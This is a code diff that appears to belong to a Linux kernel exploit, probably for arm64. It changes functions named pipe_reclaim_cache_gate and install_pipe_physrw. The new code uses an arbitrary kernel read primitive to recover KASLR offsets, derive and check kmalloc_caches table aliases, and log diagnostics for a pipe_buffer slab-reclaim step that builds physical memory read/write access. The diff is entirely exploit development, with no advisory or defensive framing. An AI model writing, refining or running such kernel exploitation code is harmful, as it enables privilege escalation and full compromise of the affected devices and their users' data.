@@ -604,9 +604,110 @@ int pipe_reclaim_cache_gate(int fd) {
   memset(pipe_page_type, 0, sizeof(pipe_page_type));
 
   uint64_t cache_slots[KMALLOC_CACHE_SLOTS];
+  uint64_t canonical_slots[KMALLOC_CACHE_SLOTS];
+  uint64_t runtime_alias_slots[KMALLOC_CACHE_SLOTS];
+  uint64_t alias_first = 0;
+  uint64_t canonical_first = 0;
+  int64_t physvirt_offset_value = 0;
+  uint64_t kimage_voffset_value = 0;
   memset(cache_slots, 0, sizeof(cache_slots));
+  memset(canonical_slots, 0, sizeof(canonical_slots));
+  memset(runtime_alias_slots, 0, sizeof(runtime_alias_slots));
   uintptr_t kmalloc_caches = data_addr(KMALLOC_CACHES);
-  kernel_read_data(fd, kmalloc_caches, cache_slots, sizeof(cache_slots));
+  uintptr_t kmalloc_caches_canonical = kaslr_image_addr(KMALLOC_CACHES);
+  uintptr_t physvirt_offset_canonical =
+      kaslr_image_addr(PHYSVIRT_OFFSET_IMAGE);
+  uintptr_t kimage_voffset_canonical =
+      kaslr_image_addr(KIMAGE_VOFFSET_IMAGE);
+  errno = 0;
+  ssize_t physvirt_offset_ret = kernel_read_data(
+      fd, physvirt_offset_canonical, &physvirt_offset_value,
+      sizeof(physvirt_offset_value));
+  int physvirt_offset_errno = errno;
+  errno = 0;
+  ssize_t kimage_voffset_ret = kernel_read_data(
+      fd, kimage_voffset_canonical, &kimage_voffset_value,
+      sizeof(kimage_voffset_value));
+  int kimage_voffset_errno = errno;
+  uintptr_t kmalloc_caches_phys = 0;
+  uintptr_t kmalloc_caches_runtime_alias = 0;
+  ssize_t runtime_alias_table_ret = -1;
+  int runtime_alias_table_errno = 0;
+  if (physvirt_offset_ret == (ssize_t)sizeof(physvirt_offset_value) &&
+      kimage_voffset_ret == (ssize_t)sizeof(kimage_voffset_value)) {
+    kmalloc_caches_phys =
+        kmalloc_caches_canonical - (uintptr_t)kimage_voffset_value;
+    kmalloc_caches_runtime_alias =
+        kmalloc_caches_phys - (uintptr_t)physvirt_offset_value;
+    errno = 0;
+    runtime_alias_table_ret = kernel_read_data(
+        fd, kmalloc_caches_runtime_alias, runtime_alias_slots,
+        sizeof(runtime_alias_slots));
+    runtime_alias_table_errno = errno;
+  }
+  int runtime_alias_matches_canonical = 0;
+  errno = 0;
+  ssize_t alias_word_ret =
+      kernel_read_data(fd, kmalloc_caches, &alias_first, sizeof(alias_first));
+  int alias_word_errno = errno;
+  errno = 0;
+  ssize_t canonical_word_ret = kernel_read_data(
+      fd, kmalloc_caches_canonical, &canonical_first, sizeof(canonical_first));
+  int canonical_word_errno = errno;
+  errno = 0;
+  ssize_t alias_table_ret =
+      kernel_read_data(fd, kmalloc_caches, cache_slots, sizeof(cache_slots));
+  int alias_table_errno = errno;
+  errno = 0;
+  ssize_t canonical_table_ret = kernel_read_data(
+      fd, kmalloc_caches_canonical, canonical_slots, sizeof(canonical_slots));
+  int canonical_table_errno = errno;
+  /* Compare complete snapshots after both reads have completed. */
+  runtime_alias_matches_canonical =
+      runtime_alias_table_ret == (ssize_t)sizeof(runtime_alias_slots) &&
+      canonical_table_ret == (ssize_t)sizeof(canonical_slots) &&
+      memcmp(runtime_alias_slots, canonical_slots,
+             sizeof(runtime_alias_slots)) == 0;
+  /* data_addr() still uses the profile's static physical load address. On
+   * this firmware it points at a different mapping for kmalloc_caches. Only
+   * let the cache gate consume the runtime-derived alias after a complete
+   * byte-for-byte check against the canonical image mapping. */
+  int cache_table_valid = runtime_alias_matches_canonical;
+  if (cache_table_valid) {
+    memcpy(cache_slots, runtime_alias_slots, sizeof(cache_slots));
+  } else {
+    memset(cache_slots, 0, sizeof(cache_slots));
+  }
+  pr_info("pipe live map globals physvirt_addr=%016zx ret=%zd/%d "
+          "value=%016llx kimage_addr=%016zx ret=%zd/%d value=%016llx\n",
+          physvirt_offset_canonical, physvirt_offset_ret,
+          physvirt_offset_errno,
+          (unsigned long long)(uint64_t)physvirt_offset_value,
+          kimage_voffset_canonical, kimage_voffset_ret,
+          kimage_voffset_errno,
+          (unsigned long long)kimage_voffset_value);
+  pr_info("pipe live map kmalloc_caches canonical=%016zx phys=%016zx "
+          "runtime_alias=%016zx table=%zd/%d match=%d q0=%016llx "
+          "q10=%016llx\n",
+          kmalloc_caches_canonical, kmalloc_caches_phys,
+          kmalloc_caches_runtime_alias, runtime_alias_table_ret,
+          runtime_alias_table_errno, runtime_alias_matches_canonical,
+          (unsigned long long)runtime_alias_slots[0],
+          (unsigned long long)runtime_alias_slots[10]);
+  pr_info("pipe cache table alias=%016zx canonical=%016zx bytes=%zu "
+          "word=%zd/%d:%016llx,%zd/%d:%016llx "
+          "table=%zd/%d,%zd/%d q0=%016llx,%016llx q10=%016llx,%016llx\n",
+          kmalloc_caches, kmalloc_caches_canonical, sizeof(cache_slots),
+          alias_word_ret, alias_word_errno,
+          (unsigned long long)alias_first,
+          canonical_word_ret, canonical_word_errno,
+          (unsigned long long)canonical_first,
+          alias_table_ret, alias_table_errno,
+          canonical_table_ret, canonical_table_errno,
+          (unsigned long long)cache_slots[0],
+          (unsigned long long)canonical_slots[0],
+          (unsigned long long)cache_slots[10],
+          (unsigned long long)canonical_slots[10]);
   kmalloc_normal_1k_cache =
     cache_slots[KMALLOC_NORMAL_TYPE * KMALLOC_BUCKETS + 10];
   kmalloc_normal_2k_cache =
@@ -616,8 +717,12 @@ int pipe_reclaim_cache_gate(int fd) {
   kmalloc_cgroup_2k_cache =
     cache_slots[KMALLOC_CGROUP_TYPE * KMALLOC_BUCKETS + 11];
 
+  const size_t pipe_cache_slot =
+      KMALLOC_CGROUP_TYPE * KMALLOC_BUCKETS + KMALLOC_PIPE_INDEX;
   kmalloc_pipe_cache =
-    kernel_read64(fd, data_addr(KMALLOC_CGROUP_PIPE_SLOT));
+      cache_table_valid && pipe_cache_slot < KMALLOC_CACHE_SLOTS
+          ? cache_slots[pipe_cache_slot]
+          : 0;
   pr_info("pipe caches normal1k=%016zx normal2k=%016zx "
           "cgroup1k=%016zx cgroup2k=%016zx selected=%016zx\n",
           kmalloc_normal_1k_cache, kmalloc_normal_2k_cache,
@@ -648,7 +753,7 @@ int pipe_reclaim_cache_gate(int fd) {
       candidate_slab_cache = slab_cache;
     }
     for (int slot = 0; slot < KMALLOC_CACHE_SLOTS; slot++) {
-      if (cache_slots[slot] == slab_cache) {
+      if (slab_cache != 0 && cache_slots[slot] == slab_cache) {
         pipe_cache_slot_hit = slot;
       }
     }
@@ -907,6 +1012,19 @@ int install_pipe_physrw(int fd) {
             (unsigned long long)pipe_scan_first_page,
             (unsigned long long)pipe_scan_first_ops,
             pipe_scan_first_len, pipe_scan_first_flags);
+    /* The page marker can survive even when reclaim freed the mm_struct slab.
+     * Read the struct page metadata for each 4 KiB subpage so the next run can
+     * distinguish a failed kmalloc-1k reclaim from a pipe_buffer layout miss.
+     * This is diagnostic only: restore the order-3 base and gate state. */
+    uintptr_t order3_base = pipebuf_page_base;
+    int gate_before = pipe_cache_gate_ok;
+    int cache_match = pipe_reclaim_cache_gate(fd);
+    pr_info("phys step pipe cache diagnostic matched=%d page_index=%d "
+            "cache_slot=%d gate=%d order3_base=%016zx\n",
+            cache_match, pipe_cache_page_index, pipe_cache_slot_hit,
+            pipe_cache_gate_ok, order3_base);
+    pipebuf_page_base = order3_base;
+    pipe_cache_gate_ok = gate_before;
   }
   if (!found) {
     return 0;
